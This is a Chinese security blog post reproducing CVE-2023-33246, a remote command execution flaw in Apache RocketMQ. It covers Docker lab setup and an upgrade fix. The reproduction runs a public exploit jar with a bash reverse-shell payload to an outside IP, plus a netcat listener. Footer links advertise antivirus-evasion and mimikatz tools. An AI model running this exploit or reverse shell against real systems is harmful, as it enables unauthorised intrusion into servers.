> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eDvpx-7dm3byw9TxHXPLow)

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBW0oRLickDlwBXcvdg0O19gnebUeltmibDpIdnE7pZS608XbClUn5GruVUKjqWFhIQlyk0Bzjs5N8g/640?wx_fmt=png)

0x01 前言

RocketMQ 是阿里巴巴在 2012 年开发的分布式消息中间件，专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。

0x02 漏洞描述

在 RocketMQ 5.1.0 及以下版本在一定条件下，会存在远程命令执行风险；由于 RocketMQ 的 NameServer、Broker、Controller 等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。此外攻击者还可以通过伪造 RocketMQ 协议内容来达到同样的效果。

0x03 影响版本

```
Apache RocketMQ <= 5.1.0
Apache RocketMQ <= 4.9.5

```

0x04 环境搭建

本次直接用 docker 拉取漏洞环境。  

```
下载docker镜像：
docker pull apache/rocketmq:4.9.1
docker pull apacherocketmq/rocketmq-console:2.0.0

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yRVRRXMEekoQZWibMUic40BUVEuelFnfGtdPFvRcbUypj5MnoG7vIjvqg/640?wx_fmt=png)

```
启动namesrv：
docker run -d -p 9876:9876 -v /data/namesrv/logs:/root/logs -v /data/namesrv/store:/root/store --name rmqnamesrv -e "MAX_POSSIBLE_HEAP=100000000" apache/rocketmq:4.9.1 sh mqnamesrv

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yM7GkZfVmzKA9THt5onIibichp9hTkibGh7g5tdnxTzfCbeqYBiau41VYEA/640?wx_fmt=png)

启动 broker 服务（先创建并配置 broker 文件）  

```
创建broker文件目录
mkdir -p /NDTSec/rocketmq/conf/
配置broker文件
vim /NDTSec/rocketmq/conf/broker.conf
将下面内容复制粘贴到broker.conf配置文件中：
brokerClusterName = DefaultCluster 
brokerName = broker-a 
brokerId = 0 
deleteWhen = 04 
fileReservedTime = 48 
brokerRole = ASYNC_MASTER 
flushDiskType = SYNC_FLUSH

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yEFfbKN1744x8TxzxNMyibPPHiaP99ev2ckH26oJqGga9smfepbymGQMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6ygVSx0xvLibibDXicESa23GJpWO8WP476w29IqdHNjgrQCyFmkiaEzibfiacA/640?wx_fmt=png)

启动 broker：

```
docker run -d -p 10911:10911 -p 10909:10909 -v /data/broker/logs:/root/logs -v /data/broker/store:/root/store -v /NDTSec/rocketmq/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -e "MAX_POSSIBLE_HEAP=200000000" apache/rocketmq:4.9.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yctBghjuC9mibueYzOOqghuXIfJeA7siabYFqicoVfMbDNv9HDuNd6HWPA/640?wx_fmt=png)

启动 console：  

```
docker run -d --name rmqconsole -p 8899:8080 --link rmqnamesrv:namesrv\
 -e "JAVA_OPTS=-Drocketmq.namesrv.addr=192.168.88.104:9876\
 -Dcom.rocketmq.sendMessageWithVIPChannel=false"\
 -t apacherocketmq/rocketmq-console:2.0.0

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yrMxg3NMicgE9eU3sEHq5HrFYVlWDgDuhnwjujBT0kWg3HsQUKdicDDYg/640?wx_fmt=png)

环境搭建成功！  

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yicea3TomqwvIFQic6UjxRu9ia2Zv5yLDofpwglfbQia1pYtcwssy5iagjog/640?wx_fmt=png)

0x05 漏洞复现

环境搭建成功页面是这个酱紫

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yhTiajdNWvCtRKKWvCHXAuC8qibGp2qr2gSzddmedjfic27MZk5RJ2qrbA/640?wx_fmt=png)

直接利用 Github 上大佬写好的工具反弹 shell：

https://github.com/Serendipity-Lucky/CVE-2023-33246

```
java -jar CVE-2023-33246.jar -ip "1.1.1.1" -cmd "bash -i >& /dev/tcp/4.4.4.4/1122 0>&1"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yJicg9TM7oAnS6SGKSRlY2TtafP5sSe6Xm25QoAf7dFo1D5r9BzW7kcA/640?wx_fmt=png)

PS：自己本地测试的时候，反弹 shell 的 ip 不能与 docker 启动环境的 ip 一样，不然接收不到 shell

NC 监听：

```
nc -lvnp 1122

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCB7b5tv2zqmrO3nyTEfkc6yUYZib7uhdQoicKzpygwchOYOmmhmdQOWYIdDm3SPskO51bibveMQhWOlg/640?wx_fmt=png)

0x06 修复方案

```
目前官方已发布安全修复更新，受影响用户可以升级到 Apache RocketMQ 5.1.1或者4.9.6
建议及时更新至最新版本

```

  

往期推荐  

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247521495&idx=1&sn=caac7e98e96267c6e24e740f1bcefd79&chksm=ce643e4ef913b7586a9525fe0ed4fa5e5b3114bc2d0fbc2b278387e860b1e55ca4c656adf70b&scene=21#wechat_redirect)[【漏洞系列】叮~ 你有新的速递！某软 RCE 漏洞（附 EXP）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484930&idx=1&sn=5999d0d9dcc565490627aba8b2d9374a&chksm=cf51a4a8f8262dbec92c5e2a8a9fb49b22127d5685c8ee279763a00715984d2db1ef7253f97f&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247521495&idx=1&sn=caac7e98e96267c6e24e740f1bcefd79&chksm=ce643e4ef913b7586a9525fe0ed4fa5e5b3114bc2d0fbc2b278387e860b1e55ca4c656adf70b&scene=21#wechat_redirect)【漏洞系列】[叮～你有新的速递！某友 - OA 信息泄露登录后台（附 EXP）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484939&idx=1&sn=d716dcd24ec991341c0ada7cc329f343&chksm=cf51a4a1f8262db712687929265a9a461f9c07b441abe88f8f4f1b66083572c7396b8780a4f1&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【漏洞系列】[叮～你有新的速递！CNVD-2023-08743 漏洞（附 PoC）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484607&idx=1&sn=5b01c17d9ec3ff0868d963b7f7c6813e&chksm=cf51a615f8262f0389be2dda88ea983918621369b52abeb99e2958591d8d8be109e527978537&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【漏洞系列】](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484499&idx=1&sn=e93b049f9085b44e86fbc392cf313e77&chksm=cf51a6f9f8262fefc86b142742bc80f7008893e2b397aa55627006eb112e69e1aea84e5fb7f6&scene=21#wechat_redirect)叮～你有新的速递！CVE-2023-29922 漏洞（附脚本）

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【漏洞系列】[叮～你有新的速递！CVE-2023-22480 漏洞（附 EXP）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484476&idx=1&sn=cc692da2d62e07d4a4d053069b72ef05&chksm=cf51a696f8262f80df9622f9c1da64233d54e07f0936d5a7212744281223a07755bfd0983249&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【漏洞系列】[叮～你有新的速递！CVE-2023-25135 漏洞（附 EXP）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484455&idx=1&sn=a3fb258e716a3b0d11eea3f7e59939bc&chksm=cf51a68df8262f9b5a8cf8fe6fe680ba96a529f1bf9295b380e98e66d4587ea54ef1515a14b1&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)[【漏洞系列】叮~ 你有新的速递！CVE-2023-27524 漏洞利用 Tools](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484438&idx=1&sn=5c90cf5a201e5c55c1dc580e72c4fec1&chksm=cf51a6bcf8262faacc7b300663610c9c5d4bd05e6f5d005668a9656a8cd52a670bf5274852f0&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【免杀系列】[New 免杀工具 NPS 更新 5.21（附下载）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484488&idx=1&sn=01dee9adc0f3fc47a30611878fc26818&chksm=cf51a6e2f8262ff4dbcdb3f41e3bcd70f360acea7aeb26b2a8ce979dc2d842837c0149e60139&scene=21#wechat_redirect)  

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【免杀系列】[TQL！最新 Bypass360 核晶与 Defender 免杀（附下载）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484432&idx=1&sn=990f9164a17faa75bd7bc9533fbae805&chksm=cf51a6baf8262fac77018716e49727e214c3326d836f7f8738253dddb93a4c9b8d90560caf05&scene=21#wechat_redirect)  

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【免杀系列】[Bypass | mimikatz 的 N 种利用 Tools 包含一些免杀方法（附下载）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484415&idx=1&sn=10c1c5954c2042da7bd29cb0ca75034c&chksm=cf51a155f8262843ad79a4af2a23377addf879067161f6fe54b06f85fa25376868a9e8d30ff9&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【免杀系列】[New 一款红队免杀生成 Tools（附下载）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484353&idx=1&sn=b1a2b72c3627b044b4c4a27c5381d705&chksm=cf51a16bf826287d80e81f76c30ccae7d002849bac4ee29f3ac9769d2239f851e533753c1b5e&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【移动安全】[踩坑 | Fiddler 雷电模拟器 4.0 无法抓包（超详细）](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484576&idx=1&sn=5f1324059a625b9196d03cff8fc88efd&chksm=cf51a60af8262f1c59d5db867825b28568cda221ecfb109c9f5e719600bd38a97910d32c56f7&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247514122&idx=1&sn=43f49b48546886e346132edd28f0fffc&chksm=ce641293f9139b85847fd204bd522c0b3b9326136e355646c0916cd3f6d9fc3bc99aff0438ae&scene=21#wechat_redirect)【移动安全】[牛掰！Xposed 检测绕过总结](http://mp.weixin.qq.com/s?__biz=Mzg4MjgxNjk2NQ==&mid=2247484332&idx=1&sn=87d9f128182c6064755a99b0eb6a3e7a&chksm=cf51a106f8262810386a9033bac2c760533fa9ae008e444987de2d4e1aa7b05971916c686c05&scene=21#wechat_redirect)

觉得内容不错，就点下 “_**赞**_” 和 “_**在看**_”_**  
如侵权请私聊公众号删文**_